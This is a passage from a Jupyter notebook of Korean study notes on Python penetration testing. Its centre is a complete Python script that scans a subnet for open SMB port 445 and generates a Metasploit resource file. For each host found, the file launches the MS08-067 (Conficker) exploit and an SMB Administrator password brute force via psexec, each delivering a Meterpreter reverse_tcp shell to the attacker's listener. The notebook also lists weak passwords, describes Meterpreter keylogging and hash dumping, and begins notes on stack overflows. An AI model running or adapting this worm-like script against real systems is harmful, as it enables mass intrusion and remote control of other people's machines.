      "    Ethernet adapter \ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd:\n",
      "\n",
      "            Connection-specific DNS Suffix  . : localdomain\n",
      "            IP Address. . . . . . . . . . . . : 172.16.190.134\n",
      "            Subnet Mask . . . . . . . . . . . : 255.255.255.0\n",
      "            Default Gateway . . . . . . . . . : 172.16.190.2\n",
      "\n",
      "    Ethernet adapter Bluetooth \ufffd\ufffd\u01ae\ufffd\ufffd\u0169 \ufffd\ufffd\ufffd\ufffd:\n",
      "\n",
      "            Media State . . . . . . . . . . . : Media disconnected\n",
      "\n",
      "    C:\\WINDOWS\\system32>"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### \uba54\ud0c0\uc2a4\ud50c\ub85c\uc787\uacfc \ud30c\uc774\uc36c \uc5f0\ub3d9\ud558\uae30\n",
      "\n",
      "- \uc124\uc815 \ud30c\uc77c\uc744 \ub9cc\ub4e0 \ud6c4\uc5d0 \uc131\uacf5\uc801\uc73c\ub85c \ucef4\ud4e8\ud130\ub97c \uacf5\uaca9\ud558\uc5ec \uc258 \ud68d\ub4dd\n",
      "- TCP 445\ubc88 \ud3ec\ud2b8\uac00 \uc5f4\ub824\uc788\ub294 254\uac1c\uc758 \ud638\uc2a4\ud2b8\ub97c \uc2a4\uce90\ub2dd\n",
      "- TCP 445\ubc88 \ud3ec\ud2b8: SMB \ud504\ub85c\ud1a0\ucf5c\uc758 \uc8fc\uc694 \ud3ec\ud2b8\n",
      "- TCP 445\ubc88 \ud3ec\ud2b8\uac00 \uc5f4\ub824\uc788\ub294 \uacf3\ub9cc \uacf5\uaca9\ud558\uba74 \ub418\uba70, \uc5f4\ub824\uc788\uc9c0 \uc54a\uc740 \ucef4\ud4e8\ud130\ub294 \uacf5\uaca9\ud574\ubd24\uc790 \ubb34\uc758\ubbf8"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import nmap"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 36
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import nmap\n",
      "\n",
      "def findTgts(subNet):\n",
      "    nmScan = nmap.PortScanner()\n",
      "    nmScan.scan(subNet, '445')\n",
      "    tgtHosts = []\n",
      "    for host in nmScan.all_hosts():\n",
      "        if nmScan[host].has_tcp(445):\n",
      "            state = nmScan[host]['tcp'][445]['state']\n",
      "            if state == 'open':\n",
      "                print '[+] Found Target Host: ' + host\n",
      "                tgtHosts.append(host)\n",
      "    return tgtHosts"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 37
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "- \uacf5\uaca9\uc5d0 \uc131\uacf5\ud55c \ucef4\ud4e8\ud130\ub97c \ub300\uc0c1\uc73c\ub85c \ub9ac\uc2a4\ub108\ub97c \uc124\uc815\ud560 \uac83\n",
      "- \uc774 \ub9ac\uc2a4\ub108 \ub610\ub294 \uacf5\uaca9 \uba85\ub839 \ucc44\ub110\uc740 \ud574\ud0b9\uc5d0 \uc131\uacf5\ud558\uba74 \uacf5\uaca9\ub300\uc0c1 \ud638\uc2a4\ud2b8\uc640 \uc6d0\uaca9\uc5d0\uc11c \uc791\ub3d9\ud560 \uc218 \uc788\uac8c \ud574\uc90c\n",
      "- \uba54\ud0c0\uc2a4\ud50c\ub85c\uc787\uc744 \ubcf4\uba74 \uace0\uae09 \ubc0f \ub2e4\uc774\ub098\ubbf9\ud55c \ud398\uc774\ub85c\ub4dc\uc778 Meterpreter \ub77c\ub294 \uac83\uc774 \uc788\ub2e4.\n",
      "- \ubbf8\ud130\ud504\ub9ac\ud130\ub294 \uc6d0\uaca9\uc758 \ucef4\ud4e8\ud130\uc5d0\uc11c \uc2e4\ud589\ub418\uba74\uc11c \uacf5\uaca9 \uba85\ub839 \ud638\uc2a4\ud2b8\ub85c \uc5f0\uacb0\ud558\uba70, \uac10\uc5fc\ub41c \ub300\uc0c1\uc744 \ubd84\uc11d \ubc0f \uc81c\uc5b4\ud560 \uc218 \uc788\ub294 \ub2e4\uc591\ud55c \uae30\ub2a5 \uc81c\uacf5\n",
      "- \ubbf8\ud130\ud504\ub9ac\ud130\ub294 \ud3ec\ub80c\uc2dd \uac1d\uccb4 \uac80\uc0c9, \uba85\ub839\uc5b4 \uc2e4\ud589, \uac10\uc5fc\ub41c \ud638\uc2a4\ud2b8\uc758 \ud2b8\ub798\ud53d \uacbd\ub85c, \ud0a4\ub85c\uac70 \uc124\uce58, \ud328\uc2a4\uc6cc\ub4dc \ud574\uc2dc \ub364\ud504 \ub4f1\uc758 \uae30\ub2a5 \uc81c\uacf5\n",
      "\n",
      "\n",
      "- \ubbf8\ud130\ud504\ub9ac\ud130\uac00 \uacf5\uaca9 \uba85\ub839\uc744 \uc704\ud574 \uacf5\uaca9\uc790\ub85c \ub2e4\uc2dc \ub9ac\ubc84\uc2a4 \uc5f0\uacb0\uc744 \ud558\uba74, \uba54\ud0c0\uc2a4\ud50c\ub85c\uc787\uc740 multi/handler \ub77c\ub294 \ubaa8\ub4c8\uc744 \ud638\ucd9c\ud55c\ub2e4.\n",
      "- \uc6b0\ub9ac\uc758 \ucef4\ud4e8\ud130\uc5d0 multi/handler \ub9ac\uc2a4\ub108\ub97c \uc124\uc815\ud558\uae30 \uc704\ud574\uc11c\ub294 \uba3c\uc800 \uba54\ud0c0\uc2a4\ud50c\ub85c\uc787 \uc790\uc6d0 \uc124\uc815 \ud30c\uc77c\uc5d0 \uc9c0\uc2dc\ub97c \uc801\uc5b4\uc57c \ud568\n",
      "- \ud398\uc774\ub85c\ub4dc\ub97c reverse_tcp \uc5f0\uacb0\ub85c \uc124\uc815\ud558\ub294 \ubc29\ubc95\uacfc \uc5f0\uacb0\ub418\uae38 \uc6d0\ud558\ub294 \uc6b0\ub9ac\uc758 \ub85c\uceec \ud638\uc2a4\ud2b8 \uc8fc\uc18c\uc640 \ud3ec\ud2b8\ub97c \ub098\ud0c0\ub0b4\ub294 \ubc29\ubc95\n",
      "- \uc774\ubbf8 1\uac1c\uc758 \ub9ac\uc2a4\ub2dd\uc774 \uc788\uae30 \ub54c\ubb38\uc5d0 \uad11\uc5ed \uc124\uc815\uc744 DisablePayloadHandler\ub85c \uc124\uc815\ud558\uc5ec \ubbf8\ub798\uc758 \ubaa8\ub4e0 \ud638\uc2a4\ud2b8\ub294 \ucd94\uac00\uc801\uc73c\ub85c \ud578\ub4e4\ub7ec\ub97c \uc124\uc815\ud560 \ud544\uc694\uac00 \uc5c6\uc74c"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### [Wireshark can't run in mac](http://ask.wireshark.org/questions/12140/cant-run-wireshark-in-mac-os-x-mountain-lion)\n",
      "\n",
      "- install xQuartz\n",
      "- Mac\uc5d0\uc11c GUI\ub97c \uafb8\uba70\uc8fc\ub294 \ud504\ub808\uc784\uc6cc\ud06c\uc778\ub4ef. \uc708\ub3c4\uc6b0\ub098 \ub9ac\ub205\uc2a4\ubcf4\ub2e4 UI\uac00 \ud6e8\uc52c \ub098\uc058\ub2e4."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "def setupHandler(configFile, lhost, lport):\n",
      "    configFile.write('use exploit/multi/handler\\n')\n",
      "    configFile.write('set PAYLOAD ' 'windows/meterpreter/reverse_tcp\\n')\n",
      "    configFile.write('set LPORT ' + str(lport) + '\\n')\n",
      "    configFile.write('set LHOST ' + lhost + '\\n')\n",
      "    configFile.write('exploit -j -z\\n')\n",
      "    configFile.write('setg DisablePayloadHandler 1\\n')"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 38
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "- \uacf5\uaca9\ub300\uc0c1\uc5d0 \uacf5\uaca9\ud560 \uc218 \uc788\ub294 \uc218\uc900\uae4c\uc9c0 \uc2a4\ud06c\ub9bd\ud2b8\uac00 \uc644\uc131\n",
      "- \uc774 \ud568\uc218\ub294 \uba54\ud0c0\uc2a4\ud50c\ub85c\uc787 \uc124\uc815 \ud30c\uc77c, \uacf5\uaca9\ub300\uc0c1 \uadf8\ub9ac\uace0 \uacf5\uaca9\ud560 \ud3ec\ud2c0\ub974 \uc785\ub825 \ubc1b\uc74c\n",
      "- \ud568\uc218\ub294 \ud2b9\uc815 \uacf5\uaca9\ucf54\ub4dc \uc124\uc815\uc744 \uc124\uc815 \ud30c\uc77c\uc5d0 \uc800\uc7a5\ud55c\ub2e4.\n",
      "\n",
      "\n",
      "1. \ucee8\ud53c\ucee4\uc5d0\uc11c \uc0ac\uc6a9\ud55c ms08_067_netapi\ub97c \uc120\ud0dd\n",
      "2. \ubbf8\ud130\ud504\ub9ac\ud130 \ud398\uc774\ub85c\ub4dc\ub97c \uc120\ud0dd\ud558\uace0 \ub85c\uceec\uc8fc\uc18c\uc640 \ub85c\uceec\ud3ec\ud2b8\ub97c \uc124\uc815\n",
      "3. -j(\uc791\uc5c5\uc758 \ucee8\ud14d\uc2a4\ud2b8\uc5d0\uc11c)\uc640 -z(\uc791\uc5c5\uacfc \uc989\uc2dc \uc0c1\ud638\uc791\uc6a9\ud558\uc9c0 \ub9d0\uace0) \uc635\uc158\uc744 \uc0ac\uc6a9\ud558\uc5ec \ucef4\ud4e8\ud130\ub97c \uacf5\uaca9\ud558\ub77c\ub294 \uc9c0\uc2dc\n",
      "\n",
      "\n",
      "- \uc2a4\ud06c\ub9bd\ud2b8\ub294 \uc5ec\ub7ec \uac1c\uc758 \ud638\uc2a4\ud2b8\ub97c \ub3d9\uc2dc\uc5d0 \uacf5\uaca9\ud560 \uac83\uc774\uae30 \ub54c\ubb38\uc5d0, \ubaa8\ub450 \ub3d9\uc2dc\uc5d0 \uc0c1\ud638\uc791\uc6a9\ud560 \uc218 \uc5c6\uc73c\ubbc0\ub85c \uc774\ub4e4 \uc635\uc158\uc774 \ud544\uc218"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### \uc6d0\uaca9 \ud504\ub85c\uc138\uc2a4 \uc2e4\ud589 \uacf5\uaca9\ud558\uae30\n",
      "\n",
      "- \ud604\uc7ac\ub294 \ubcf4\uc548 \ud328\uce58\ub97c \uc801\uc6a9\ud558\ub294 \uac83\ub9cc\uc73c\ub85c\ub3c4 \uac04\ub2e8\ud558\uac8c \ubc29\uc9c0 \uac00\ub2a5\n",
      "- \ub530\ub77c\uc11c \ucee8\ud53c\ucee4 \uc6dc\uc5d0\uc11c \uc0ac\uc6a9\ud55c \ub450\ubc88\uc9f8 \uacf5\uaca9 \ubca1\ud130\ub3c4 \uc2a4\ud06c\ub9bd\ud2b8\uc5d0 \ud3ec\ud568\uc2dc\ucf1c\uc57c \ud568\n",
      "- SMB\uc758 \uc0ac\uc6a9\uc790\uc774\ub984/\ud328\uc2a4\uc6cc\ub4dc \uc870\ud569\uc744 \ubb34\ucc28\ubcc4 \ub300\uc785 \uacf5\uaca9\uc744 \ud558\uc5ec \uc6d0\uaca9\uc5d0\uc11c \uc2e4\ud589\uc911\uc778 \ud504\ub85c\uc138\uc2a4(psexec)\uc5d0 \ub300\ud55c \uc811\uadfc \uad8c\ud55c\uc744 \ud68d\ub4dd\ud574\uc57c \ud568\n",
      "- smbBrute \ud568\uc218\ub294 \uba54\ud0c0\uc2a4\ud50c\ub85c\uc787\uc758 \uc124\uc815 \ud30c\uc77c, \uacf5\uaca9\ub300\uc0c1 \ud638\uc2a4\ud2b8, \ud328\uc2a4\uc6cc\ub4dc \ubaa9\ub85d\uc744 \uc800\uc7a5\ud55c \ud30c\uc77c, \ub85c\uceec \uc8fc\uc18c \uadf8\ub9ac\uace0 \ub9ac\uc2a4\ub108 \ud3ec\ud2b8 \ub4f1\uc744 \uc785\ub825 \ubc1b\uc74c\n",
      "- \uc0ac\uc6a9\uc790\uc774\ub984\uc744 \ub514\ud3f4\ud2b8 \uc708\ub3c4\uc6b0 \uacc4\uc815\uc778 Administrator\ub85c \uc124\uc815\ud558\uace0 \ud328\uc2a4\uc6cc\ub4dc \ud30c\uc77c\uc744 \uc5f0\ub2e4.\n",
      "- \ud30c\uc77c\uc5d0 \uc788\ub294 \uac01 \ud328\uc2a4\uc6cc\ub4dc\ub9c8\ub2e4 \ud568\uc218\ub294 \uba54\ud0c0\uc2a4\ud50c\ub85c\uc787\uc758 \uc124\uc815\uc744 \ud30c\uc77c\uc744 \ub9cc\ub4e4\uc5b4\uc11c \uc6d0\uaca9 \ud504\ub85c\uc138\uc2a4 \uc2e4\ud589 \uacf5\uaca9\ucf54\ub4dc\ub97c \uc0ac\uc6a9\ud568\n",
      "- \ub9cc\uc57d \uc0ac\uc6a9\uc790\uc774\ub984/\ud328\uc2a4\uc6cc\ub4dc \uc870\ud569\uc774 \uc131\uacf5\ud558\uba74, \uacf5\uaca9\ucf54\ub4dc\ub294 \ubbf8\ud130\ud504\ub9ac\ud130 \ud398\uc774\ub85c\ub4dc\ub97c \ub85c\uceec \uc8fc\uc18c\uc640 \ud3ec\ud2b8\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc2e4\ud589"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):\n",
      "    username = 'Administrator'\n",
      "    pF = open(passwdFile, 'r')\n",
      "    for password in pF:\n",
      "        password = password.strip('\\n').strip('\\r')\n",
      "        configFile.write('use exploit/windows/smb/psexec\\n')\n",
      "        configFile.write('set SMBUser ' + str(username) + '\\n')\n",
      "        configFile.write('set SMBPass ' + str(password) + '\\n')\n",
      "        configFile.write('set RHOST ' + str(tgtHost) + '\\n')\n",
      "        configFile.write('set PAYLOAD ' +\\\n",
      "                         'windows/meterpreter/reverse_tcp\\n')\n",
      "        configFile.write('set LPORT ' + str(lport) + '\\n')\n",
      "        configFile.write('set LHOST ' + lhost + '\\n')\n",
      "        configFile.write('exploit -j -z\\n')"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 40
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### \ucee8\ud53c\ucee4 \ucd5c\uc885 \ucf54\ub4dc \ud1b5\ud569\ud558\uae30\n",
      "\n",
      "- \ubaa8\ub4e0 \uac83\uc744 \ud1b5\ud569\ud558\uba74 \uacf5\uaca9\uc774 \uac00\ub2a5\ud55c \ub300\uc0c1\uc744 \uc2a4\uce94\ud558\uace0\n",
      "- \uacf5\uaca9\uc774 \uac00\ub2a5\ud558\uba74 MS08_067 \ucde8\uc57d\uc810\uacfc \uc778\uc99d\uc815\ubcf4 \ubb34\ucc28\ubcc4 \ub300\uc785 \uacf5\uaca9\uc744 \ud1b5\ud574 \uacf5\uaca9\ub300\uc0c1\uc744 \uacf5\uaca9\ud558\ub294 \uc2a4\ud06c\ub9bd\ud2b8\uac00 \uc644\uc131\ub428\n",
      "- \ub9c8\uc9c0\ub9c9\uc73c\ub85c main() \ud568\uc218\uc5d0 \uc635\uc158\uc744 \ucc98\ub9ac\ud558\ub294 \ucf54\ub4dc\ub97c \ucd94\uac00\ud558\uace0 \uc55e\uc5d0\uc11c \uc791\uc131\ud55c \ud568\uc218\ub4e4\uc744 \ubaa8\ub450 \ud1b5\ud569\ud558\uba74 \uc2a4\ud06c\ub9bd\ud2b8\uac00 \uc644\uc131 \ub428"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import os\n",
      "import optparse\n",
      "import sys\n",
      "import nmap\n",
      "\n",
      "def findTgts(subNet):\n",
      "    nmScan = nmap.PortScanner()\n",
      "    nmScan.scan(subNet, '445')\n",
      "    tgtHosts = []\n",
      "    for host in nmScan.all_hosts():\n",
      "        if nmScan[host].has_tcp(445):\n",
      "            state = nmScan[host]['tcp'][445]['state']\n",
      "            if state == 'open':\n",
      "                print '[+] Found Target Host: ' + host\n",
      "                tgtHosts.append(host)\n",
      "    return tgtHosts\n",
      "\n",
      "def setupHandler(configFile, lhost, lport):\n",
      "    configFile.write('use exploit/multi/handler\\n')\n",
      "    configFile.write('set payload ' +\\\n",
      "                     'windows/meterpreter/reverse_tcp\\n')\n",
      "    configFile.write('set LPORT ' + str(lport) + '\\n')\n",
      "    configFile.write('set LHOST ' + lhost + '\\n')\n",
      "    configFile.write('exploit -j -z\\n')\n",
      "    configFile.write('setg DisablePayloadHandler 1\\n')\n",
      "    \n",
      "def confickerExploit(configFile, tgtHost, lhost, lport):\n",
      "    configFile.write('use exploit/windows/smb/ms08_067_netapi\\n')\n",
      "    configFile.write('set RHOST ' + str(tgtHost) + '\\n')\n",
      "    configFile.write('set payload ' +\\\n",
      "                     'windows/meterpreter/reverse_tcp\\n')\n",
      "    configFile.write('set LPORT ' + str(lport) + '\\n')\n",
      "    configFile.write('set LHOST ' + lhost + '\\n')\n",
      "    configFile.write('exploit -j -z\\n')\n",
      "    \n",
      "def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):\n",
      "    username = 'Administrator'\n",
      "    pF = open(passwdFile, 'r')\n",
      "    for password in pF:\n",
      "        password = password.strip('\\n').strip('\\r')\n",
      "        configFile.write('use exploit/windows/smb/psexec\\n')\n",
      "        configFile.write('set SMBUser ' + str(username) + '\\n')\n",
      "        configFile.write('set SMBPass ' + str(password) + '\\n')\n",
      "        configFile.write('set RHOST ' + str(tgtHost) + '\\n')\n",
      "        configFile.write('set payload ' +\\\n",
      "                         'windows/meterpreter/reverse_tcp\\n')\n",
      "        configFile.write('set LPORT ' + str(lport) + '\\n')\n",
      "        configFile.write('set LHOST ' + lhost + '\\n')\n",
      "        configFile.write('exploit -j -z\\n')\n",
      "        \n",
      "def main():\n",
      "    configFile = open('ch02/meta.rc', 'w')\n",
      "    parser = optparse.OptionParser('[-]Usage%prog ' +\\\n",
      "                                   '-H <RHOST[s]> ' +\\\n",
      "                                   '-l <LHOST> ' +\\\n",
      "                                   '[-p <LPORT> ' +\\\n",
      "                                   '-F <Password File>]')\n",
      "    parser.add_option('-H', dest='tgtHost', type='string', \\\n",
      "                      help='specify the target address[es]')\n",
      "    parser.add_option('-p', dest='lport', type='string', \\\n",
      "                      help='specify the listen port')\n",
      "    parser.add_option('-l', dest='lhost', type='string', \\\n",
      "                      help='specify the listen address')\n",
      "    parser.add_option('-F', dest='passwdFile', type='string', \\\n",
      "                      help='password file for SMB brute force attempt')\n",
      "    (options, args) = parser.parse_args()\n",
      "    if (options.tgtHost == None) | (options.lhost == None):\n",
      "        print parser.usage\n",
      "        exit(0)\n",
      "    lhost = options.lhost\n",
      "    lport = options.lport\n",
      "    if lport == None:\n",
      "        lport = '1337'\n",
      "    passwdFile = options.passwdFile\n",
      "    tgtHosts = findTgts(options.tgtHost)\n",
      "    setupHandler(configFile, lhost, lport)\n",
      "    for tgtHost in tgtHosts:\n",
      "        confickerExploit(configFile, tgtHost, lhost, lport)\n",
      "        if passwdFile != None:\n",
      "            smbBrute(configFile, tgtHost, passwdFile, lhost, lport)\n",
      "    configFile.close()\n",
      "    os.system('msfconsole -r ch02/meta.rc')\n",
      "    \n",
      "if __name__ == '__main__':\n",
      "    main()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stderr",
       "text": [
        "Usage: [-]Usage-c -H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]\n",
        "\n",
        "-c: error: no such option: -f\n"
       ]
      },
      {
       "ename": "SystemExit",
       "evalue": "2",
       "output_type": "pyerr",
       "traceback": [
        "An exception has occurred, use %tb to see the full traceback.\n",
        "\u001b[0;31mSystemExit\u001b[0m\u001b[0;31m:\u001b[0m 2\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stderr",
       "text": [
        "To exit: use 'exit', 'quit', or Ctrl-D.\n"
       ]
      }
     ],
     "prompt_number": 41
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!cat ch02/pass.txt"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "admin\r\n",
        "root\r\n",
        "toor\r\n",
        "password\r\n",
        "violent\r\n",
        "password1\r\n",
        "12345"
       ]
      }
     ],
     "prompt_number": 120
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%%writefile ch02/passwords.txt\n",
      "nice\n",
      "good\n",
      "1\n",
      "test"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Writing ch02/passwords.txt\n"
       ]
      }
     ],
     "prompt_number": 44
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### [Using Metasploit got STATUS_LOGON_FAILURE in Windows XP SP3](https://community.rapid7.com/thread/1932)\n",
      "\n",
      "- \uc774\uac83 \ub54c\ubb38\uc5d0 8\uc2dc\uac04 \uc815\ub3c4 \uc0bd\uc9d1..\n",
      "- \ubb38\uc81c\ub294 xp\uc5d0\uc11c \ub85c\uceec\ubcf4\uc548 \uc815\ucc45- \ubcf4\uc548 \uc635\uc158 - \ub124\ud2b8\uc6cc\ud06c \uc561\uc138\uc11c: \ub85c\uceec \uacc4\uc815\uc5d0 \ub300\ud55c \uacf5\uc720 \ubc0f \ubcf4\uc548 \ub4f1\ub85d \uc815\ubcf4\uc5d0\uc11c Guest\ub9cc \ud5c8\uc6a9\ub418\uc5b4 \uc788\uae30 \ub54c\ubb38\uc774\ub2e4.(default) \uc65c \uadf8 \uc218 \ub9ce\uc740 \ub3d9\uc601\uc0c1\uc5d0\uc11c\ub294 \uc774\uac78 \uc0dd\ub7b5\ud574 \ub1a8\uc744\uae4c? \n",
      "- \ub2e4\ub978 \ub3d9\uc601\uc0c1\uc5d0\uc11c\ub294 \uc798 \ub418\ub294\ub370.. \uc65c \ub0b4\uac83\ub9cc \uc548\ub3fc\uc9c0? \uac81\ub098 \uc0bd\uc9c8\ud588\ub2e4..\n",
      "\n",
      "<img src=\"files/images/local_security.png\" />"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "#Pass-the-hash Attack against Windows XP\n",
      "YouTubeVideo('EeFHDvesy5w')"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "html": [
        "\n",
        "        <iframe\n",
        "            width=\"400\"\n",
        "            height=300\"\n",
        "            src=\"https://www.youtube.com/embed/EeFHDvesy5w\"\n",
        "            frameborder=\"0\"\n",
        "            allowfullscreen\n",
        "        ></iframe>\n",
        "        "
       ],
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 46,
       "text": [
        "<IPython.lib.display.YouTubeVideo at 0x10e5b2f90>"
       ]
      }
     ],
     "prompt_number": 46
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "----\n",
      "\n",
      "#### Change default directory in vsftpd\n",
      "\n",
      "- [Changing default directory on 'vsftp' server](http://www.linuxquestions.org/questions/linux-software-2/changing-default-directory-on-vsftp-server-167202/): change home directory in /etc/passwd\n",
      "- [Apache start in Backtrack](http://www.question-defense.com/2012/12/11/apache-start-backtrack-services-httpd-apache-start)\n",
      "\n",
      "----"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "## \uc81c\ub85c\ub370\uc774 \uac1c\ub150\uc758 \uacf5\uaca9 \ucf54\ub4dc \uac1c\ubc1c\ud558\uae30\n",
      "\n",
      "- \uba54\ud0c0\uc2a4\ud50c\ub85c\uc787 \ud504\ub808\uc784\uc6cc\ud06c\uc5d0\ub294 \ubb34\ub824 8\ubc31\uac1c \uc774\uc0c1\uc758 \uace0\uc720 \uacf5\uaca9\ucf54\ub4dc\uac00 \ud0d1\uc7ac\ub418\uc5b4 \uc788\ub2e4\uace0\ub294 \ud558\ub098, \uc9c1\uc811 \uacf5\uaca9\ucf54\ub4dc\ub97c \uc791\uc131\ud574\uc57c \ud560 \uc0c1\ud669\uc774 \ubc1c\uc0dd\ud560 \uc218\ub3c4 \uc788\ub2e4. \uc5b4\ub5bb\uac8c \ud30c\uc774\uc36c\uc774 \uc774 \uacfc\uc815\uc744 \ub2e8\uc21c\ud654\ud558\ub294\ub370 \ub3c4\uc6c0\uc774 \ub418\ub294\uc9c0 \uc124\uba85\n",
      "\n",
      "\n",
      "- \ubaa8\ub9ac\uc2a4 \uc6dc\uc774 \uc131\uacf5\ud55c \uc774\uc720 \uc911\uc5d0 \ud558\ub098\ub294 Finger \uc11c\ube44\uc2a4\uc5d0 \ub300\ud55c \uc2a4\ud0dd \uae30\ubc18\uc758 \ubc84\ud37c \uc624\ubc84\ud50c\ub85c\uc6b0\uac00 \uac00\ub2a5\ud588\uae30 \ub54c\ubb38(US v. Morris &, 1991)\n",
      "- \ud504\ub85c\uadf8\ub7a8\uc774 \uc0ac\uc6a9\uc790\uc758 \uc785\ub825\uac12\uc744 \uc81c\ub300\ub85c \uac80\uc99d\ud558\uc9c0 \uc54a\uc558\uae30 \ub54c\ubb38\n",
      "- 1988\ub144\uc5d0 \ubaa8\ub9ac\uc2a4 \uc6dc\uc774 \uc2a4\ud0dd \uae30\ubc18\uc758 \ubc84\ud37c \uc624\ubc84\ud50c\ub85c\uc6b0\ub97c \uc0ac\uc6a9\ud558\uae30\ub294 \ud588\uc73c\ub098, 1996\ub144\uc5d0 \ub418\uc5b4\uc11c\uc57c Elias Levy \ub77c\ub294 \uc0ac\ub78c\uc774 Phrack Megazine\uc5d0 \"Smashing the Stack for Fun and Profit\" \ub77c\ub294 \uc81c\ubaa9\uc73c\ub85c \uc774 \uacf5\uaca9 \uae30\ubc95\uc744 \ubc1c\ud45c(One, 1996)\n",
      "- \uc2a4\ud0dd \uae30\ubc18\uc758 \ubc84\ud37c \uc624\ubc84\ud50c\ub85c\uc6b0\uac00 \uc5b4\ub5bb\uac8c \uc791\ub3d9\ud558\ub294\uc9c0 \uc798 \uc774\ud574\ud558\uc9c0 \ubabb\ud558\uaca0\ub2e4\uac70\ub098 \ub354 \uae4a\uc774 \uc774\ud574\ud558\uace0 \uc2f6\ub2e4\uba74 \uadf8\uc758 \ub17c\ubb38\uc744 \uc77d\uc73c\uba74 \ub3c4\uc6c0\uc774 \ub420 \uac83\n",
      "- \uc6b0\ub9ac\ub294 \ubaa9\uc801\uc0c1 \uc2a4\ud0dd \uae30\ubc18\uc758 \ubc84\ud37c \uc624\ubc84\ud50c\ub85c\uc6b0 \uacf5\uaca9\uc758 \ud575\uc2ec\uc801\uc778 \uac1c\ub150\uc5d0 \ub300\ud574\uc11c\ub9cc \uc54c\uc544\ubcfc \uac83\n",
      "\n",
      "### \uc2a4\ud0dd \uae30\ubc18\uc758 \ubc84\ud37c \uc624\ubc84\ud50c\ub85c\uc6b0 \uacf5\uaca9\n",
      "\n",
      "- \uc2a4\ud0dd \uae30\ubc18\uc758 \ubc84\ud37c \uc624\ubc84\ud50c\ub85c\uc6b0\uc758 \uacbd\uc6b0 \uc0ac\uc6a9\uc790\uac00 \uc785\ub825\ud55c \uac12\uc744 \uac80\uc99d\ud558\uc9c0 \uc54a\uc544\uc11c \uadf8 \uac12\uc774 \ud504\ub85c\uadf8\ub7a8\uc758 \ub2e4\uc74c \uc9c0\uc2dc\ub97c \uac00\ub9ac\ud0a4\ub294 EIP\ub97c \ub36e\uc5b4\uc4f0\uac8c \ub418\uba70 \ud504\ub85c\uadf8\ub7a8\uc758 \ud750\ub984\uc744 \uc81c\uc5b4\ud558\uac8c \ub41c\ub2e4.\n",
      "- \uacf5\uaca9\ucf54\ub4dc\ub294 \uacf5\uaca9\uc790\uac00 \uc0bd\uc785\ud55c \uc258\ucf54\ub4dc\uac00 \uc788\ub294 \uc704\uce58\ub85c EIP \ub808\uc9c0\uc2a4\ud130\uac00 \ud3ec\uc778\ud2b8\ud558\uac8c \ub9cc\ub4ec\n",
      "- \uae30\uacc4\uc5b4\ub85c \ub418\uc5b4\uc788\ub294 \uc258\ucf54\ub4dc\ub294 \uacf5\uaca9\ub300\uc0c1 \uc2dc\uc2a4\ud15c\uc5d0 \uc0ac\uc6a9\uc790\ub97c \ucd94\uac00\ud55c\ub2e4\ub4e0\uc9c0, \uacf5\uaca9\uc790\ub85c \ub124\ud2b8\uc6cc\ud06c \uc5f0\uacb0\uc744 \uc0dd\uc131\ud55c\ub2e4\ub4e0\uc9c0, \uc544\ub2c8\uba74 \ub3c5\ub9bd\uc801\uc778 \uc2e4\ud589 \ud30c\uc77c\uc744 \ub2e4\uc6b4\ub85c\ub4dc \ud55c\ub2e4\ub358\uc9c0 \ud560 \uc218 \uc788\ub2e4.\n",
      "- \uc258\ucf54\ub4dc\uc758 \uac00\ub2a5\uc131\uc740 \ubb34\ud55c\ud568.\n",
      "- \uc258\ucf54\ub4dc\uc758 \uac00\ub2a5\uc131\uc740 \uba54\ubaa8\ub9ac\uc5d0\uc11c \uc0ac\uc6a9\ud560 \uc218 \uc788\ub294 \uacf5\uac04\uc774 \uc5bc\ub9c8\ub098 \uc788\ub294\uc9c0\uc5d0 \ub2ec\ub824\uc788\uc74c\n",
      "\n",
      "#### \uc2a4\ud0dd \uae30\ubc18\uc758 \ubc84\ud37c \uc624\ubc84\ud50c\ub85c\uc6b0 \uacf5\uaca9\ucf54\ub4dc\uc758 \ud575\uc2ec\uc801\uc778 \uc694\uc18c\ub4e4\n",
      "\n",
      "- Overflow: \uc2a4\ud0dd\uc5d0 \ud560\ub2f9\ub418\uc5b4 \uc788\ub294 \uac12\ubcf4\ub2e4 \ub354 \ud070 \uc785\ub825\uac12\uc744 \uc0ac\uc6a9\uc790\uac00 \uc785\ub825\ud558\ub294 \uac83\n",
